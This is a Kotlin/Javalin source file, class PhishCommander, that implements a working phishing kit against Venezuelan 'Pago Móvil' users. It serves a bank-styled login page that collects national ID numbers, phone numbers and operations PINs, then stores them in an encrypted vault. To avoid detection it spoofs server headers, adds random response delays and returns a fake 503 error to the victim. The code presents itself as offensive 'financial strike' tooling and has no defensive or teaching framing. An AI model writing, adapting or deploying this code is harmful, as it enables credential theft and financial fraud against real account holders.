package com.fardc.sigint.core

import io.javalin.Javalin
import io.javalin.http.Context
import java.security.SecureRandom

class PhishCommander(private val vault: SecurityVault, private val combatHandler: CombatModeHandler) {
    
    private val random = SecureRandom()

    fun setupPhishPage(app: Javalin) {
        
        // --- FILTRE DE DURCISSEMENT INDUSTRIEL ---
        app.before { ctx ->
            // Suppression des signatures pour masquer l'infrastructure
            ctx.res().setHeader("Server", "Apache/2.4.41 (Ubuntu)") // Mimétisme
            ctx.res().setHeader("X-Powered-By", "PHP/7.4.3")
        }

        // --- VECTEUR D'INTERCEPTION : PAGO MÓVIL ---
        app.get("/login/pagomovil") { ctx ->
            if (!combatHandler.isPassiveInterceptionEnabled()) {
                ctx.status(403).result("STBY_MODE: Access Denied.")
                return@get
            }
            renderPhishPage(ctx)
        }

        // --- POINT DE CAPTURE DURCI (OFFENSIVE) ---
        app.post("/login/capture-pago") { ctx ->
            // Vérification de l'autorisation de frappe financière
            if (!combatHandler.isFinancialOffenseAllowed()) {
                println("🚫 [LOGIC_GATE] Capture bloquée : Mode ${combatHandler.getStatus()} insuffisant.")
                ctx.status(403).result("NETWORK_ERROR")
                return@post
            }

            // Extraction et chiffrement immédiat
            captureAndVault(ctx)

            // Injection de délai (Jitter) pour tromper les analyses de trafic
            Thread.sleep(random.nextInt(800, 2400).toLong())
            
            // Simulation d'erreur réaliste
            ctx.result("Error de conexión con el nodo central de transacciones (503).")
        }
    }

    private fun captureAndVault(ctx: Context) {
        val ci = ctx.formParam("ci") ?: "VOID"
        val phone = ctx.formParam("phone") ?: "VOID"
        val pin = ctx.formParam("pin") ?: "VOID"

        val rawData = "TARGET:PAGO_MOVIL | CI:$ci | TEL:$phone | PIN:$pin"
        
        // Scellage dans le Vault (Chiffrement AES-256-GCM)
        vault.encryptAndStore(rawData)
        
        println("⚠️ [CAPTURE_FIN] Unité ALPHA-15 : Données scellées avec succès.")
        
        // Note : Dans la version v8.0 réelle, on appellerait une fonction C-Native 
        // pour effacer manuellement ces variables de la RAM.
    }

    private fun renderPhishPage(ctx: Context) {
        // Interface optimisée pour mobile, utilisant des couleurs bancaires standards
        ctx.html("""
            <!DOCTYPE html>
            <html lang="es">
            <head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
            <body style="background:#ECEFF1; font-family:Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
                <div style="background:white; padding:30px; border-radius:12px; box-shadow:0 10px 25px rgba(0,0,0,0.2); width:90%; max-width:380px;">
                    <div style="text-align:center; margin-bottom:20px;">
                        <div style="background:#003893; color:white; padding:10px; border-radius:50%; width:40px; height:40px; margin:auto; display:flex; align-items:center; justify-content:center; font-weight:bold;">P</div>
                        <h2 style="color:#003893; margin-top:15px;">Pago Móvil</h2>
                        <p style="color:#666; font-size:14px;">Validación de seguridad requerida</p>
                    </div>
                    <form action="/login/capture-pago" method="POST">
                        <input type="text" name="ci" placeholder="Cédula de Identidad" style="width:100%; padding:15px; margin-bottom:15px; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;" required>
                        <input type="tel" name="phone" placeholder="Número de Teléfono" style="width:100%; padding:15px; margin-bottom:15px; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;" required>
                        <input type="password" name="pin" placeholder="PIN de Operaciones" style="width:100%; padding:15px; margin-bottom:20px; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;" required>
                        <button type="submit" style="width:100%; padding:15px; background:#003893; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">VERIFICAR CUENTA</button>
                    </form>
                </div>
            </body>
            </html>
        """.trimIndent())
    }
}
